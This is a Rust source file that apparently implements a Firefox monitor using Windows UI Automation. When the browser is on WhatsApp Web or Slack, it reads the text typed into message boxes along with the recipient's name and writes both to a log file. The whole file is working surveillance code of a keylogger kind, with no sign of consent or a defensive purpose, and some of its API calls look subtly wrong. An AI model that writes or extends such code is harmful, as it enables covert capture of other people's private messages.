use std::sync::{Arc, Mutex};
use windows::Win32::UI::Accessibility::{
    IUIAutomationElement,
    UIA_EVENT_ID,
    UIA_Text_TextSelectionChangedEventId,
    UIA_Text_TextChangedEventId,
    UIA_Invoke_InvokedEventId,
    UIA_Window_WindowOpenedEventId,
    UIA_AutomationIdPropertyId,
    UIA_ValueValuePropertyId,
    UIA_LegacyIAccessibleRolePropertyId,
    UIA_AriaRolePropertyId,
    UIA_ButtonControlTypeId,
    UIA_LegacyIAccessibleDefaultActionPropertyId,
    UIA_IsInvokePatternAvailablePropertyId,
    UIA_IsScrollItemPatternAvailablePropertyId,
};
use windows::core::Interface;
use crate::logger::Logger;
use crate::error::Result;
use super::common::{handle_generic_event, get_element_value, get_element_name};
use crate::uia::UiaContext;

pub fn create_firefox_handler(logger: Arc<Mutex<Logger>>) -> Box<dyn Fn(&IUIAutomationElement, &str, &str, UIA_EVENT_ID) -> Result<()> + Send + Sync> {
    Box::new(move |element, process_name, date, event_id| {
        match event_id {
            UIA_Text_TextSelectionChangedEventId | UIA_Text_TextChangedEventId => {
                handle_firefox_text_event(element, process_name, date, logger.clone())
            }
            UIA_Invoke_InvokedEventId | UIA_Window_WindowOpenedEventId => {
                handle_generic_event(element, process_name, date, event_id, &logger)
            }
            _ => handle_generic_event(element, process_name, date, event_id, &logger),
        }
    })
}

fn handle_firefox_text_event(
    element: &IUIAutomationElement,
    process_name: &str,
    date: &str,
    logger: Arc<Mutex<Logger>>,
) -> Result<()> {
    // Get URL bar element
    let automation = UiaContext::new()?.automation().clone();
    let url_bar = unsafe {
        let condition = automation.CreatePropertyCondition(
            UIA_AutomationIdPropertyId,
            &"urlbar-input".into(),
        )?;
        
        element.FindFirst(
            windows::Win32::UI::Accessibility::TreeScope_Ancestors,
            &condition,
        )?
    };

    if url_bar.is_null() {
        return handle_generic_event(element, process_name, date, UIA_Text_TextChangedEventId, &logger);
    }

    let url = get_element_value(&url_bar)?;
    let domain = extract_domain(&url);

    match domain.as_str() {
        "web.whatsapp.com" => handle_whatsapp(element, process_name, date, logger),
        "app.slack.com" => handle_slack(element, process_name, date, logger),
        _ => handle_generic_event(element, process_name, date, UIA_Text_TextChangedEventId, &logger),
    }
}

fn handle_whatsapp(
    element: &IUIAutomationElement,
    process_name: &str,
    date: &str,
    logger: Arc<Mutex<Logger>>,
) -> Result<()> {
    // Check if this is a message input field
    let role_value = unsafe {
        let mut role = 0i32;
        element.GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &mut role)?;
        role
    };

    if role_value != 42 {
        return Ok(());
    }

    let aria_role = unsafe {
        let mut role = Vec::<u16>::new();
        element.GetCurrentPropertyValue(UIA_AriaRolePropertyId, &mut role.into())?;
        String::from_utf16_lossy(&role)
    };

    if aria_role != "textbox" {
        return Ok(());
    }

    // Find the chat recipient
    let automation = UiaContext::new()?.automation().clone();
    let conditions = unsafe {
        let control_type = automation.CreatePropertyCondition(
            UIA_AutomationIdPropertyId,
            &UIA_ButtonControlTypeId.into(),
        )?;
        let default_action = automation.CreatePropertyCondition(
            UIA_LegacyIAccessibleDefaultActionPropertyId,
            &"click".into(),
        )?;
        let invoke = automation.CreatePropertyCondition(
            UIA_IsInvokePatternAvailablePropertyId,
            &true.into(),
        )?;
        let scroll = automation.CreatePropertyCondition(
            UIA_IsScrollItemPatternAvailablePropertyId,
            &true.into(),
        )?;

        let and1 = automation.CreateAndCondition(&control_type, &default_action)?;
        let and2 = automation.CreateAndCondition(&and1, &invoke)?;
        automation.CreateAndCondition(&and2, &scroll)?
    };

    let profile_info = unsafe {
        element.FindFirst(
            windows::Win32::UI::Accessibility::TreeScope_Ancestors,
            &conditions,
        )?
    };

    if profile_info.is_null() {
        return Ok(());
    }

    let recipient = get_element_name(&profile_info)?;
    let message = get_element_value(element)?;

    let log_message = format!(
        "{} {} [WhatsApp Message]\nTo: {}\nMessage: {}\n",
        date, process_name, recipient, message
    );

    if let Ok(mut logger) = logger.lock() {
        logger.log(&log_message)?;
    }

    Ok(())
}

fn handle_slack(
    element: &IUIAutomationElement,
    process_name: &str,
    date: &str,
    logger: Arc<Mutex<Logger>>,
) -> Result<()> {
    // Check if this is a message input field
    let role_value = unsafe {
        let mut role = 0i32;
        element.GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &mut role)?;
        role
    };

    if role_value != 42 {
        return Ok(());
    }

    let aria_role = unsafe {
        let mut role = Vec::<u16>::new();
        element.GetCurrentPropertyValue(UIA_AriaRolePropertyId, &mut role.into())?;
        String::from_utf16_lossy(&role)
    };

    if aria_role != "textbox" {
        return Ok(());
    }

    let recipient = get_element_name(element)?;
    let message = get_element_value(element)?;

    let log_message = format!(
        "{} {} [Slack Message]\nTo: {}\nMessage: {}\n",
        date, process_name, recipient, message
    );

    if let Ok(mut logger) = logger.lock() {
        logger.log(&log_message)?;
    }

    Ok(())
}

fn extract_domain(url: &str) -> String {
    url.split("://")
        .nth(1)
        .unwrap_or(url)
        .split('/')
        .next()
        .unwrap_or("")
        .to_string()
} 